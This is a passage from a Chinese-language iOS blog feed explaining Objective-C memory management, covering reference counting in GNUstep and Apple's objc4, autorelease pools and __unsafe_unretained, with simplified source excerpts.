<p><a href="http://blog.tracyone.com/2015/06/14/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAARC-%E4%B8%8A/" target="_blank" rel="external">Tracy Wang-深入浅出ARC(上)</a></p>
<p><a href="http://www.jianshu.com/p/ff8a7c458c96" target="_blank" rel="external">原来我非不快乐-我们的对象会经历什么</a></p>
<p><a href="http://www.desgard.com/weak/" target="_blank" rel="external">desgard-weak 弱引用的实现方式</a></p>
<p><a href="http://ios.jobbole.com/90310/" target="_blank" rel="external">Objc 对象的今生今世</a></p>
<p><a href="http://yulingtianxia.com/blog/2015/12/06/The-Principle-of-Refenrence-Counting/" target="_blank" rel="external">玉令天下-Objective-C 引用计数原理</a></p>
<p><a href="http://www.jianshu.com/p/9d649ce6d0b8" target="_blank" rel="external">一缕殇流化隐半边冰霜-神经病院Objective-C Runtime入院第一天——isa和Class</a></p>
<p><a href="http://sindrilin.com/runtime/2016/12/23/闲聊内存管理" target="_blank" rel="external">sindrilin-闲聊内存管理</a></p>
</blockquote>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我 <a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#x3a;&#x63;&#111;&#x64;&#101;&#114;&#x66;&#x69;&#x73;&#104;&#64;&#x31;&#x36;&#x33;&#x2e;&#x63;&#x6f;&#109;">&#x63;&#111;&#x64;&#101;&#114;&#x66;&#x69;&#x73;&#104;&#64;&#x31;&#x36;&#x33;&#x2e;&#x63;&#x6f;&#109;</a>。</p>
<p>博主是 iOS 妹子一枚。</p>
<p>希望大家一起进步。</p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在写 『&lt;a href=&quot;http://zhoulingyu.com/2017/02/08/iOS进阶——iOS-Memory-Block/&quot;&gt;iOS（Objective-C） 内存管理&amp;amp;Block&lt;/a&gt;』 一文时，我并没有发现 NSObject 的代码已经被开源了，所以分析的主要是 GNUStep 的源码，对 Apple 的部分只是通过猜测。&lt;/p&gt;
&lt;p&gt;实质上，NSObject 的实现内容已经开源在 &lt;a href=&quot;https://opensource.apple.com/tarballs/objc4/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;objc4-706&lt;/a&gt; 中。于是我便开始学习 objc4 中的内容。&lt;/p&gt;
&lt;p&gt;下面就和大家扒一扒 Apple 的 NSObject 内存管理的一些内容。&lt;/p&gt;
&lt;h1 id=&quot;SideTable&quot;&gt;&lt;a href=&quot;#SideTable&quot; class=&quot;headerlink&quot; title=&quot;SideTable&quot;&gt;&lt;/a&gt;SideTable&lt;/h1&gt;&lt;p&gt;找到 NSObject.mm，首先来一些非常重要的信息，以便后面的理解。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;objc4-706 NSObject.mm SideTable:&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight objc&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; SideTable &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 保证原子操作的自旋锁&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    spinlock_t slock;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 引用计数的 hash 表&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    RefcountMap refcnts;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// weak 引用全局 hash 表&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    weak_table_t weak_table;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
      <category term="iOS进阶" scheme="http://zhoulingyu.com/categories/iOS/iOS%E8%BF%9B%E9%98%B6/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
      <category term="iOS进阶" scheme="http://zhoulingyu.com/tags/iOS%E8%BF%9B%E9%98%B6/"/>
    
  </entry>
  
  <entry>
    <title>iOS进阶——iOS（Objective-C） 内存管理&amp;Block</title>
    <link href="http://zhoulingyu.com/2017/02/08/iOS%E8%BF%9B%E9%98%B6%E2%80%94%E2%80%94iOS-Memory-Block/"/>
    <id>http://zhoulingyu.com/2017/02/08/iOS进阶——iOS-Memory-Block/</id>
    <published>2017-02-08T15:33:40.000Z</published>
    <updated>2017-05-15T02:48:26.479Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一篇-iOS-内存管理"><a href="#第一篇-iOS-内存管理" class="headerlink" title="第一篇 iOS 内存管理"></a>第一篇 iOS 内存管理</h1><h2 id="1-似乎每个人在学习-iOS-过程中都考虑过的问题"><a href="#1-似乎每个人在学习-iOS-过程中都考虑过的问题" class="headerlink" title="1 似乎每个人在学习 iOS 过程中都考虑过的问题"></a>1 似乎每个人在学习 iOS 过程中都考虑过的问题</h2><ol>
<li>alloc retain release delloc 做了什么？</li>
<li>autoreleasepool 是怎样实现的？</li>
<li>__unsafe_unretained 是什么？</li>
<li>Block 是怎样实现的</li>
<li>什么时候会引起循环引用，什么时候不会引起循环引用？</li>
</ol>
<p>所以我将在本篇博文中详细的从 ARC 解释到 iOS 的内存管理，以及 Block 相关的原理、源码。</p>
<h2 id="2-从-ARC-说起"><a href="#2-从-ARC-说起" class="headerlink" title="2 从 ARC 说起"></a>2 从 ARC 说起</h2><p>说 iOS 的内存管理，就不得不从 ARC（Automatic Reference Counting / 自动引用计数） 说起， ARC 是 WWDC2011 和 iOS5 引入的变化。ARC 是 LLVM 3.0 编译器的特性，用来自动管理内存。</p>
<p>与 Java 中 GC 不同，ARC 是编译器特性，而不是基于运行时的，所以 ARC 其实是在编译阶段自动帮开发者插入了管理内存的代码，而不是实时监控与回收内存。</p>
<a id="more"></a>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E8%BF%9B%E9%98%B6%E2%80%94%E2%80%94iOS%20%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86&amp;Block-01.png" alt="ARC 管理内存"></p>
<p>ARC 的内存管理规则可以简述为：</p>
<blockquote>
<ol>
<li>每个对象都有一个『被引用计数』</li>
<li>对象被持有，『被引用计数』+1</li>
<li>对象被放弃持有，『被引用计数』-1</li>
<li>『引用计数』=0，释放对象</li>
</ol>
</blockquote>
<h2 id="3-你需要知道"><a href="#3-你需要知道" class="headerlink" title="3 你需要知道"></a>3 你需要知道</h2><p><del>1. 包含 NSObject 类的 Foundation 框架并没有公开</del><br>（此处错误，感谢 <a href="http://www.jianshu.com/u/486bf26e8dce" target="_blank" rel="external">酷酷的哀殿</a> 的指出）</p>
<ol>
<li>Foundation 框架是非开源的，但是 NSObject 被包含在 <a href="https://opensource.apple.com/source/objc4/objc4-706/runtime/NSObject.mm" target="_blank" rel="external">obj4</a> 中，该库已开源。</li>
<li>Core Foundation 框架源代码，以及通过 NSObject 进行内存管理的部分源代码是公开的。</li>
<li>GNUstep 是 Foundation 框架的互换框架</li>
</ol>
<blockquote>
<p>GNUstep 也是 GNU 计划之一。将 Cocoa Objective-C 软件库以自由软件方式重新实现<br>某种意义上，GNUstep 和 Foundation 框架的实现是相似的<br>通过 GNUstep 的源码来分析 Foundation 的内存管理</p>
</blockquote>
<h2 id="4-alloc-retain-release-dealloc-的实现"><a href="#4-alloc-retain-release-dealloc-的实现" class="headerlink" title="4 alloc retain release dealloc 的实现"></a>4 alloc retain release dealloc 的实现</h2><h3 id="4-1-GNU-alloc"><a href="#4-1-GNU-alloc" class="headerlink" title="4.1 GNU - alloc"></a>4.1 GNU - alloc</h3><p>查看 GNUStep 中的 alloc 函数。</p>
<p><strong>GNUstep/modules/core/base/Source/NSObject.m alloc:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">+ (<span class="keyword">id</span>) alloc</div><div class="line">&#123;</div><div class="line">  <span class="keyword">return</span> [<span class="keyword">self</span> allocWithZone: <span class="built_in">NSDefaultMallocZone</span>()];</div><div class="line">&#125;</div><div class="line"></div><div class="line">+ (<span class="keyword">id</span>) allocWithZone: (<span class="built_in">NSZone</span>*)z</div><div class="line">&#123;</div><div class="line">  <span class="keyword">return</span> <span class="built_in">NSAllocateObject</span> (<span class="keyword">self</span>, <span class="number">0</span>, z);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>GNUstep/modules/core/base/Source/NSObject.m NSAllocateObject:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> obj_layout &#123;</div><div class="line">    <span class="built_in">NSUInteger</span> retained;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="built_in">NSAllocateObject</span>(Class aClass, <span class="built_in">NSUInteger</span> extraBytes, <span class="built_in">NSZone</span> *zone)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span>	size = 计算容纳对象所需内存大小;</div><div class="line">    <span class="keyword">id</span>	new = <span class="built_in">NSZoneCalloc</span>(zone, <span class="number">1</span>, size);</div><div class="line">    memset (new, <span class="number">0</span>, size);</div><div class="line">    new = (<span class="keyword">id</span>)&amp;((obj)new)[<span class="number">1</span>];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>NSAllocateObject</code> 函数通过调用 <code>NSZoneCalloc</code> 函数来分配存放对象所需的空间，之后将该内存空间置为 nil，最后返回作为对象而使用的指针。</p>
<p>我们将上面的代码做简化整理：</p>
<p><strong>GNUstep/modules/core/base/Source/NSObject.m alloc 简化版本:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> obj_layout &#123;</div><div class="line">    <span class="built_in">NSUInteger</span> retained;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">+ (<span class="keyword">id</span>) alloc</div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> size = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> obj_layout) + 对象大小;</div><div class="line">    <span class="keyword">struct</span> obj_layout *p = (<span class="keyword">struct</span> obj_layout *)calloc(<span class="number">1</span>, size);</div><div class="line">    <span class="keyword">return</span> (<span class="keyword">id</span>)(p+<span class="number">1</span>)</div><div class="line">    <span class="keyword">return</span> [<span class="keyword">self</span> allocWithZone: <span class="built_in">NSDefaultMallocZone</span>()];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>alloc 类方法用 struct obj_layout 中的 <code>retained</code> 整数来保存引用计数，并将其写入对象的内存头部，该对象内存块全部置为 0 后返回。</p>
<p>一个对象的表示便如下图：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E8%BF%9B%E9%98%B6%E2%80%94%E2%80%94iOS%20%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86&amp;Block-02.png" alt="GNU 中的对象存储空间"></p>
<h3 id="4-2-GNU-retain"><a href="#4-2-GNU-retain" class="headerlink" title="4.2 GNU - retain"></a>4.2 GNU - retain</h3><p><strong>GNUstep/modules/core/base/Source/NSObject.m retainCount:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">- (<span class="built_in">NSUInteger</span>) retainCount</div><div class="line">&#123;</div><div class="line">  <span class="keyword">return</span> <span class="built_in">NSExtraRefCount</span>(<span class="keyword">self</span>) + <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">inline</span> <span class="built_in">NSUInteger</span></div><div class="line"><span class="built_in">NSExtraRefCount</span>(<span class="keyword">id</span> anObject)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">return</span> ((obj_layout)anObject)[<span class="number">-1</span>].retained;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>GNUstep/modules/core/base/Source/NSObject.m retain:</strong></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">- (id) retain</div><div class="line">&#123;</div><div class="line">  NSIncrementExtraRefCount(self);</div><div class="line">  return self;</div><div class="line">&#125;</div><div class="line"></div><div class="line">inline void</div><div class="line">NSIncrementExtraRefCount(id anObject)</div><div class="line">&#123;</div><div class="line">  if (((obj)anObject)[-1].retained == UINT_MAX - 1)</div><div class="line">    [NSException raise: NSInternalInconsistencyException</div><div class="line">      format: @"NSIncrementExtraRefCount() asked to increment too far”];</div><div class="line">  ((obj_layout)anObject)[-1].retained++;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>以上代码中， <code>NSIncrementExtraRefCount</code> 方法首先写入了当 <code>retained</code> 变量超出最大值时发生异常的代码（因为 <code>retained</code> 是 NSUInteger 变量），然后进行 <code>retain ++</code> 代码。</p>
<h3 id="4-3-GNU-release"><a href="#4-3-GNU-release" class="headerlink" title="4.3 GNU - release"></a>4.3 GNU - release</h3><p>和 retain 相应的，release 方法做的就是 <code>retain --</code>。</p>
<p><strong>GNUstep/modules/core/base/Source/NSObject.m release</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">- (<span class="keyword">oneway</span> <span class="keyword">void</span>) release</div><div class="line">&#123;</div><div class="line">  <span class="keyword">if</span> (<span class="built_in">NSDecrementExtraRefCountWasZero</span>(<span class="keyword">self</span>))</div><div class="line">    &#123;</div><div class="line">      [<span class="keyword">self</span> dealloc];</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">BOOL</span></div><div class="line"><span class="built_in">NSDecrementExtraRefCountWasZero</span>(<span class="keyword">id</span> anObject)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">if</span> (((obj)anObject)[<span class="number">-1</span>].retained == <span class="number">0</span>)</div><div class="line">  &#123;</div><div class="line">	  <span class="keyword">return</span> <span class="literal">YES</span>;</div><div class="line">	&#125;</div><div class="line">  ((obj)anObject)[<span class="number">-1</span>].retained--;</div><div class="line">	<span class="keyword">return</span> <span class="literal">NO</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="4-4-GNU-dealloc"><a href="#4-4-GNU-dealloc" class="headerlink" title="4.4 GNU - dealloc"></a>4.4 GNU - dealloc</h3><p>dealloc 将会对对象进行释放。</p>
<p><strong>GNUstep/modules/core/base/Source/NSObject.m dealloc:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">- (<span class="keyword">void</span>) dealloc</div><div class="line">&#123;</div><div class="line">  <span class="built_in">NSDeallocateObject</span> (<span class="keyword">self</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">inline</span> <span class="keyword">void</span></div><div class="line"><span class="built_in">NSDeallocateObject</span>(<span class="keyword">id</span> anObject)</div><div class="line">&#123;</div><div class="line">  obj_layout o = &amp;((obj_layout)anObject)[<span class="number">-1</span>];</div><div class="line">  free(o);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="4-5-Apple-实现"><a href="#4-5-Apple-实现" class="headerlink" title="4.5 Apple 实现"></a>4.5 Apple 实现</h3><p>在 Xcode 中 设置 <code>Debug</code> -&gt; <code>Debug Workflow</code> -&gt; <code>Always Show Disassenbly</code> 打开。这样在打断点后，可以看到更详细的方法调用。</p>
<p>通过在 NSObject 类的 alloc 等方法上设置断点追踪可以看到几个方法内部分别调用了：</p>
<p><strong>retainCount</strong></p>
<blockquote>
<p>__CFdoExternRefOperation<br>CFBasicHashGetCountOfKey</p>
</blockquote>
<p><strong>retain</strong></p>
<blockquote>
<p>__CFdoExternRefOperation<br>CFBasicHashAddValue</p>
</blockquote>
<p><strong>release</strong></p>
<blockquote>
<p>__CFdoExternRefOperation<br>CFBasicHashRemoveValue</p>
</blockquote>
<p>可以看到他们都调用了一个共同的 <code>__CFdoExternRefOperation</code> 方法。</p>
<p>该方法从前缀可以看到是包含在 Core Foundation，在 CFRuntime.c 中可以找到，做简化后列出源码：</p>
<p><strong>CFRuntime.c __CFDoExternRefOperation:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __CFDoExternRefOperation(uintptr_t op, <span class="keyword">id</span> obj) &#123;</div><div class="line">    <span class="built_in">CFBasicHashRef</span> table = 取得对象的散列表(obj);</div><div class="line">    <span class="keyword">int</span> count;</div><div class="line">    </div><div class="line">    <span class="keyword">switch</span> (op) &#123;</div><div class="line">        <span class="keyword">case</span> OPERATION_retainCount:</div><div class="line">        count = <span class="built_in">CFBasicHashGetCountOfKey</span>(table, obj);</div><div class="line">        <span class="keyword">return</span> count;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> OPERATION_retain:</div><div class="line">        count = <span class="built_in">CFBasicHashAddValue</span>(table, obj);</div><div class="line">        <span class="keyword">return</span> obj;</div><div class="line">        <span class="keyword">case</span> OPERATION_release:</div><div class="line">        count = <span class="built_in">CFBasicHashRemoveValue</span>(table, obj);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span> == count;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>所以 <code>__CFDoExternRefOperation</code> 是针对不同的操作，进行具体的方法调用，如果 op 是 <code>OPERATION_retain</code>，就去掉用具体实现 retain 的方法。</p>
<p>从 <code>BasicHash</code> 这样的方法名可以看出，其实引用计数表就是散列表。</p>
<p>key 为 hash(对象的地址) value 为 引用计数。</p>
<p>下图是 Apple 和 GNU 的实现对比：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E8%BF%9B%E9%98%B6%E2%80%94%E2%80%94iOS%20%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86&amp;Block-03.png" alt="Apple 和 GNU 内存管理的实现对比"></p>
<h2 id="5-autorelease-和-autorelaesepool"><a href="#5-autorelease-和-autorelaesepool" class="headerlink" title="5 autorelease 和 autorelaesepool"></a>5 autorelease 和 autorelaesepool</h2><p>在苹果对于 NSAutoreleasePool 的<a href="https://developer.apple.com/reference/foundation/nsautoreleasepool" target="_blank" rel="external">文档</a>中表示：</p>
<blockquote>
<p>每个线程（包括主线程），都维护了一个管理 NSAutoreleasePool 的栈。当创先新的 Pool 时，他们会被添加到栈顶。当 Pool 被销毁时，他们会被从栈中移除。<br>autorelease 的对象会被添加到当前线程的栈顶的 Pool 中。当 Pool 被销毁，其中的对象也会被释放。<br>当线程结束时，所有的 Pool 被销毁释放。</p>
</blockquote>
<p>对 NSAutoreleasePool 类方法和 autorelease 方法打断点，查看其运行过程，可以看到调用了以下函数：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">NSAutoreleasePool</span> *pool = [[<span class="built_in">NSAutoreleasePool</span> alloc] init];</div><div class="line"><span class="comment">// 等同于 objc_autoreleasePoolPush</span></div><div class="line">    </div><div class="line"><span class="keyword">id</span> obj = [[<span class="built_in">NSObject</span> alloc] init];</div><div class="line">[obj autorelease];</div><div class="line"><span class="comment">//  等同于 objc_autorelease(obj)</span></div><div class="line">    </div><div class="line">[<span class="built_in">NSAutoreleasePool</span> showPools];</div><div class="line"><span class="comment">// 查看 NSAutoreleasePool 状况</span></div><div class="line">    </div><div class="line">[pool drain];</div><div class="line"><span class="comment">// 等同于 objc_autoreleasePoolPop(pool)</span></div></pre></td></tr></table></figure>
<p><code>[NSAutoreleasePool showPools]</code> 可以看到当前线程所有 pool 的情况：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">objc[21536]: ##############</div><div class="line">objc[21536]: AUTORELEASE POOLS for thread 0x10011e3c0</div><div class="line">objc[21536]: 2 releases pending.</div><div class="line">objc[21536]: [0x101802000]  ................  PAGE  (hot) (cold)</div><div class="line">objc[21536]: [0x101802038]  ################  POOL 0x101802038</div><div class="line">objc[21536]: [0x101802040]       0x1003062e0  NSObject</div><div class="line">objc[21536]: ##############</div><div class="line">Program ended with exit code: 0</div></pre></td></tr></table></figure>
<p>在 <a href="https://github.com/opensource-apple/objc4" target="_blank" rel="external">objc4</a> 中可以查看到 AutoreleasePoolPage：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">objc4/<span class="built_in">NSObject</span>.mm AutoreleasePoolPage</div><div class="line"></div><div class="line"><span class="keyword">class</span> AutoreleasePoolPage </div><div class="line">&#123;</div><div class="line">    <span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *push() </div><div class="line">    &#123;</div><div class="line">        生成或者持有 <span class="built_in">NSAutoreleasePool</span> 类对象</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> pop(<span class="keyword">void</span> *token) </div><div class="line">    &#123;</div><div class="line">        废弃 <span class="built_in">NSAutoreleasePool</span> 类对象</div><div class="line">        releaseAll();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">id</span> autorelease(<span class="keyword">id</span> obj)</div><div class="line">    &#123;</div><div class="line">        相当于 <span class="built_in">NSAutoreleasePool</span> 类的 addObject 类方法</div><div class="line">        AutoreleasePoolPage *page = 取得正在使用的 AutoreleasePoolPage 实例;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">id</span> *add(<span class="keyword">id</span> obj)</div><div class="line">    &#123;</div><div class="line">        将对象追加到内部数组</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">void</span> releaseAll() </div><div class="line">    &#123;</div><div class="line">        调用内部数组中对象的 release 方法</div><div class="line">    &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">void</span> *</div><div class="line">objc_autoreleasePoolPush(<span class="keyword">void</span>)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (UseGC) <span class="keyword">return</span> <span class="literal">nil</span>;</div><div class="line">    <span class="keyword">return</span> AutoreleasePoolPage::push();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">void</span></div><div class="line">objc_autoreleasePoolPop(<span class="keyword">void</span> *ctxt)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (UseGC) <span class="keyword">return</span>;</div><div class="line">    AutoreleasePoolPage::pop(ctxt);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>AutoreleasePoolPage 以双向链表的形式组合而成（分别对应结构中的 parent 指针和 child 指针）。<br>thread 指针指向当前线程。<br>每个 AutoreleasePoolPage 对象会开辟4096字节内存（也就是虚拟内存一页的大小），除了上面的实例变量所占空间，剩下的空间全部用来储存autorelease对象的地址。<br>next 指针指向下一个 add 进来的 autorelease 的对象即将存放的位置。<br>一个 Page 的空间被占满时，会新建一个 AutoreleasePoolPage 对象，连接链表。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E8%BF%9B%E9%98%B6%E2%80%94%E2%80%94iOS%20%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86&amp;Block-04.png" alt="AutoreleasePoolPage"></p>
<h2 id="6-unsafe-unretained"><a href="#6-unsafe-unretained" class="headerlink" title="6 __unsafe_unretained"></a>6 __unsafe_unretained</h2><p>有时候我们除了 <code>__weak</code> 和 <code>__strong</code> 之外也会用到 <code>__unsafe_unretained</code> 这个修饰符，那么我们对 <code>__unsafe_unretained</code> 了解多少？</p>
<p><code>__unsafe_unretained</code> 是不安全的所有权修饰符，尽管 ARC 的内存管理是编译器的工作，但附有 <code>__unsafe_unretained</code> 修饰符的变量不属于编译器的内存管理对象。<strong>赋值时即不获得强引用也不获得弱引用</strong>。</p>
<p>来运行一段代码：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">id</span> __<span class="keyword">unsafe_unretained</span> obj1 = <span class="literal">nil</span>;</div><div class="line">&#123;</div><div class="line">    <span class="keyword">id</span> __<span class="keyword">strong</span> obj0 = [[<span class="built_in">NSObject</span> alloc] init];</div><div class="line">            </div><div class="line">    obj1 = obj0;</div><div class="line">            </div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"A: %@"</span>, obj1);</div><div class="line">&#125;</div><div class="line">        </div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"B: %@"</span>, obj1);</div></pre></td></tr></table></figure>
<p>运行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">2017-01-12 19:24:47.245220 __unsafe_unretained[55726:4408416] A: &lt;NSObject: 0x100304800&gt;</div><div class="line">2017-01-12 19:24:47.246670 __unsafe_unretained[55726:4408416] B: &lt;NSObject: 0x100304800&gt;</div><div class="line">Program ended with exit code: 0</div></pre></td></tr></table></figure>
<p>对代码进行详细分析：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">id</span> __<span class="keyword">unsafe_unretained</span> obj1 = <span class="literal">nil</span>;</div><div class="line">&#123;</div><div class="line">    <span class="comment">// 自己生成并持有对象</span></div><div class="line">    <span class="keyword">id</span> __<span class="keyword">strong</span> obj0 = [[<span 